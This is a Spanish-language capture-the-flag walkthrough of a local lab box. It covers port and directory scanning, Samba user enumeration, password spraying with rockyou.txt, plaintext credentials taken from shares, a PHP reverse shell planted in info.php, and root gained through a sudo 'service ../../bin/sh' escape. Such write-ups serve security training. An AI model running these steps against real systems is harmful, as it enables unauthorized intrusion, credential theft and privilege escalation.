```
nmap -sV -sC -O -p- 172.17.0.2
```

```bash
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)  
|_  256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)  
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))  
|_http-title: Login  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
139/tcp open  netbios-ssn Samba smbd 4  
445/tcp open  netbios-ssn Samba smbd 4l
```

escaneo de directorios
```bash
/.html                (Status: 403) [Size: 275]  
/.php                 (Status: 403) [Size: 275]  
/index.php            (Status: 200) [Size: 3543]  
/info.php             (Status: 200) [Size: 72710]  
/productos.php        (Status: 200) [Size: 5229]  
/.php                 (Status: 403) [Size: 275]  
/.html                (Status: 403) [Size: 275]  
/server-status        (Status: 403) [Size: 275]
```

en el puerto 80 no veo nada interesante
```bash
whatweb 172.17.0.2 

http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], Email[ejemplo@correo.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Login]
```

como tenemos sistemas Samba vamos a usar enum4linux para enumerar usuarios
```bash
enum4linux -a 172.17.0.2
```

**Salida**
```bash
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: usuario1 Name:   Desc:    
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: usuario3 Name:   Desc:    
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: administrador    Name:   Desc:    
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: usuario2 Name:   Desc:    
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: satriani7        Name:   Desc:    
  
user:[usuario1] rid:[0x3e8]  
user:[usuario3] rid:[0x3ea]  
user:[administrador] rid:[0x3ec]  
user:[usuario2] rid:[0x3e9]  
user:[satriani7] rid:[0x3eb]
```

ahora usamos crackmapexec para obtener la contraseña del SMB de los usuarios
```bash
**sudo crackmapexec smb 172.17.0.2 -u '[USER]' -p rockyou.txt --no-bruteforce**
```

para el usuario satriani7 la contraseña del SMB es 50cent

Accedemos al servidor SMB
```bash
smbclient -L //172.17.0.2 -U satriani7
# 50cent
```

**Salida**
```
       myshare         Disk      Carpeta compartida sin restricciones  
       backup24        Disk      Privado  
       home            Disk      Produccion  
       IPC$            IPC       IPC Service (EseEmeB Samba Server)
```
podemos acceder sin restricciones a myshare y a backup24 con la contraseña

```
smbclient //172.17.0.2/myshare -U satriani7
# 50cent
```

```
smb: \> ls  
 .                                   D        0  Mon Oct  7 00:26:40 2024  
 ..                                  D        0  Mon Oct  7 00:26:40 2024  
 access.txt                          N      956  Sun Oct  6 08:46:26 2024
```
```
get access.txt 

cat access.txt    
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhdHJpYW5pN0Blc2VlbWViLmRsIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjgxNjAzNzMsImV4cCI6MTcyODE2Mzk3MywiandrIjp7Imt0eSI6IlJTQSIsIm4iOiI2MzU4NTI5OTgwNzk4MDM4NzI2MjQyMzYxMjc2NTg2NjE3MzU1MzUyMTMxNjU0ODI2NDI1ODg4NDkzNTU1NDYxNTIyNTc1NTAwNjY0ODY2MDM4OTY4ODMwNTk4OTY0NjUxOTQ2NDEzMzU4OTI1MzU2OTM4MDQwMTE1MjQzMDg4MTg0NTg1MzQxMzY5NTQyNTgxNTQwOTc3MjMzMjU0MTQxNzQ5NzczNDQyODkwNjc3ODY2MjI3NzUyMzEzMzg2OTk1NzA1ODAxNzM0NjA2NDE1NjkyNTM5MjAyNzc5OTczMjczODgyNTc1NTUwMTIwMDc4NjUzNDc0MTU1MjMyMjkwMDAxNjM4NTIwMTExNTUyNjE1NDkwMjQyOTYyMDA4MjYxNDI4NzA0MjAxNjcwOTg0NDUyMjY1NzcwNyIsImUiOjY1NTM3fX0.bQhS5qLCv5bf3sy-oHS7ZGcqqjk3LqyJ5bv-Jw6DIIoSIkmBtiocq07F7joOeKRxS3roWdHEuZUMeHQfWTHwRH7pHqCIBVJObdvHI8WR_Gac_MPYvwd6aSAoNExSlZft1-hXJUWbUIZ683JqEg06VYIap0Durih2rUio4Bdzv68JIo_3M8JFMV6kQTHnM3CElKy-UdorMbTxMQdUGKLk_4C7_FLwrGQse1f_iGO2MTzxvGtebQhERv-bluUYGU3Dq7aJCNU_hBL68EHDUs0mNSPF-f_FRtdENILwF4U14PSJiZBS3e5634i9HTmzRhvCGAqY00isCJoEXC1smrEZpg
```

```
smbclient //172.17.0.2/backup24 -U satriani7
```

```
cat credentials.txt    
# Archivo de credenciales  
  
Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.  
  
Usuarios:  
-------------------------------------------------  
1. Usuario: jsmith  
  - Contraseña: PassJsmith2024!  
  
2. Usuario: abrown  
  - Contraseña: PassAbrown2024!  
  
3. Usuario: lgarcia  
  - Contraseña: PassLgarcia2024!  
  
4. Usuario: kchen  
  - Contraseña: PassKchen2024!  
  
5. Usuario: tjohnson  
  - Contraseña: PassTjohnson2024!  
  
6. Usuario: emiller  
  - Contraseña: PassEmiller2024!  
     
7. Usuario: administrador  
   - Contraseña: Adm1nP4ss2024      
  
8. Usuario: dwhite  
  - Contraseña: PassDwhite2024!  
  
9. Usuario: nlewis  
  - Contraseña: PassNlewis2024!  
  
10. Usuario: srodriguez  
  - Contraseña: PassSrodriguez2024!  
  
  
  
# Notas:  
- Mantener estas credenciales en un lugar seguro.  
- Cambiar las contraseñas periódicamente.  
- No compartir estas credenciales sin autorización.
```

intentamos entrar ssh con cada uno de esas credenciales
solo nos podemos conectar como administrador

```
administrador@350fafec954b:~$ cat /etc/passwd 

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash  
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin  
usuario1:x:1001:1001:,,,:/home/usuario1:/bin/bash  
usuario2:x:1002:1002:,,,:/home/usuario2:/bin/bash  
usuario3:x:1003:1003:,,,:/home/usuario3:/bin/bash  
satriani7:x:1004:1004:,,,:/home/satriani7:/bin/bash  
administrador:x:1005:1005::/home/administrador:/bin/sh  
redis:x:101:104::/var/lib/redis:/usr/sbin/nologin  
systemd-network:x:997:997:systemd Network Management:/:/usr/sbin/nologin  
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin  
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin  
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
```

Después de un largo rato, no conseguimos escalar privilegios desde administrador

pero observando el directorio `/var/www/html`
podemos ver que el usuario `administrador`puede ejecutar un archivo `info.php`

```
drwxrwxrwx 1 administrador administrador     23 Oct  6  2024 .  
drwxr-xr-x 1 root          root              18 Oct  6  2024 ..  
-rw-r--r-- 1 root          root          463383 Oct  6  2024 back.png  
-rw-r--r-- 1 root          root            3543 Oct  6  2024 index.php  
-rwxrwxr-x 1 administrador administrador     21 Oct  6  2024 info.php  
-rw-r--r-- 1 root          root            5229 Oct  6  2024 productos.php  
-rw-r--r-- 1 root          root             263 Oct  6  2024 styles.css
```

modificamos el contenido del documento por el del siguiente GitHub: `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`

buscamos en el navegador `http://172.17.0.2/info.php comprobando que funciona

```bash
whoami
# www-data
```

### Tratamiento de la TTY

Para trabajar mejor: Ejecutamos el siguiente comando: 
```bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

```bash
sudo -l
(ALL) NOPASSWD: /usr/sbin/service


sudo -u root /usr/sbin/service ../../bin/sh
```

```bash
whoami
# root
```